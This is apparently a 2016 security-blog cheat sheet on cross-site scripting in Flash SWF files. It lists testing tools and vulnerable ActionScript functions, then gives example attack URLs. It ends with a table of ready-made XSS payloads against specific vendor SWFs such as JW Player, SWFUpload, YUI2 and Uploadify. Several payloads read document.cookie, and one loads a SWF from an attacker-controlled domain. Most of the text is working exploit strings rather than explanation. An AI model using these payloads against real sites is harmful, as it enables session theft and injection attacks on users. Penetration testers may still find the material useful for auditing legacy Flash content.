---
title: Flash files Vulnerable Payload
date: 2016-06-17 11:27:37
tags: Flash
---

#### [SWFIntruder](https://github.com/irsdl/updated-SWFIntruder)
https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c#intro

#### Flashbang
```
> git clone https://github.com/cure53/Flashbang --recursive
> cd Flashbang/shumway
> git submodule init
> make bootstrap
> python -m SimpleHTTPServer 80     # 在Flashbang目录下启动一个Web服务,访问http://127.0.0.1/src/flashbang.html
```
#### FFDec

[FFDec](https://github.com/jindrapetrik/jpexs-decompiler/releases)

#### Vul function
##### 1) URLRequest --> getURL
```
// as3.0 version
navigateToURL(new URLRequest(link), "_self");
//as2.0 version
getURL(link,"_self");
```
> example

```
http://www.target.com/movie.swf?link=javascript:alert(1)
```
```
var root_xml:XML = new XML();
root_xml.ignoreWhite = true;
root_xml.onLoad = function(success){
    if(success){
        getURL(root_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue)
    }else{
        getURL("javascript:alert(‘fail’)")
    }
}
root_xml.load(_root.url);
```
```
<?xml version="1.0" encoding="utf-8" ?>
<data>
    <link>javascript:alert('xss')</link>
</data>
```

##### 2) ExternalInterface.call
```
try { __Flash__toXML(函数名("参数1")) ; } catch (e) { "<undefined/>"; }
```
> example

```
http://www.target.com/ExternalInterface_first.swf?func=a1lert(1))}catch(e){alert(100)}//

Output

try { __Flash__toXML(a1lert(1))}catch(e){alert(100)}// ("参数1")) ; } catch (e) { "<undefined/>"; }

http://www.target.com/ExternalInterface_second.swf?par=1111\%22),al)}catch(e){alert(1000)}//

Output

try { __Flash__toXML(alert("1111\\"),al}catch(e){alert(1000)}
```
#### 3) htmlText
```
_root.createTextField("Inputbox",0,20,20,320,240);
_root.Inputbox.html=true;
_root.Inputbox.htmlText="Welcome" + _root.username;
```
> example

```
http://www.target.com/htmltext.swf?url=?username=<img src='javascript:alert("XSS")'>

Output

"Welcome <img src='javascript:alert(XSS)'>"
```
#### 4) loadMovie(), asfunction()
```
_root.loadMovie(_root.movietoload)
```
```
http://www.target.com/FlashApp.swf?movietoload=http://hackerdomain/hackedFlash.swf
```
#### 5) ExternalInterface.addCallback()
```
ExternalInterface.addCallback('throwException',
     function(s) {
       throw new Error(s)
     }
);
```


#### Payload


Vendor  |   url
---|---
Zeroclipboard | /zeroclipboard.swf?id=\"))}catch(e){alert(1);}//&width=500&height=500&.swf
JW Player	|	/player.swf?playerready=alert(document.cookie)
JW Player	|	/player.swf?tracecall=alert(document.cookie)
Custom	|	/banner.swf?clickTAG=javascript:alert(1);//
SwfUpload v2.2.0.1	|	/swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
YUI2	|	/io.swf?yid=\"));}catch(e){alert(1);}//
Jplayer     |   /Jplayer.swf?jQuery=confirm&id=Your information.')*confirm(document.cookie%2b'&vol=0.8&muted=false&.swf
player  |   /player.swf?playerID=a\%22%29%29}catch%28e%29{alert%28document.domain%29}//
uploader    |   /uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//
tagcloud    |   /tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='http://websecurity.com.ua'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E
open-flash-chart    |   /open-flash-chart.swf?get-data=(function(){alert(/hello/)})()
io      |   /io.swf?yid=\"));}catch(e){alert(9)}//
uploadify   |   /uploadify.swf?buttonText=%3Ca%20href=%27javascript:alert%289%29%27鈥�%3ETest%3C/a%3E
downloadify |    /downloadify.swf?queue_name=%22))}catch(e){}if(!self.a)self.a=!alert('XSS');//&width&height&downloadImage=http://www.google.co.in/images/srpr/logo4w.png
flvPlayer   |   /flvPlayer.swf?flvToPlay=xss.xml
aflax   |   /aflax.swf?callback=alert(9)
redirect    |   /redirect.swf?url=javascript:alert(9);
finnor  |   /finnor.swf?clickTag=javascript:alert(1);
Vulnerable  |   /vulnerable.swf?htmlVar=%3Ca%20href%3D%22asfunction%3AgetURL%2Cjavascript%3Aalert%28%27gotcha%21%27%29%22%3E%20Click%20here%3C%2fa%3E
Pie3D   |   /Pie3D.swf?dataURL=xss.xml
link_protocol_test [only firefox] |   /link_protocol_test.swf?input=data%3Atext%2fhtml%3Btext%2C%3Cscript%3Ealert%28document.domain%29%3B%3C%2fscript%3E%2f%2f
flashmediaelement < v2.21.1  |   /flashmediaelement.swf?jsinitfunctio%gn=alert`1`



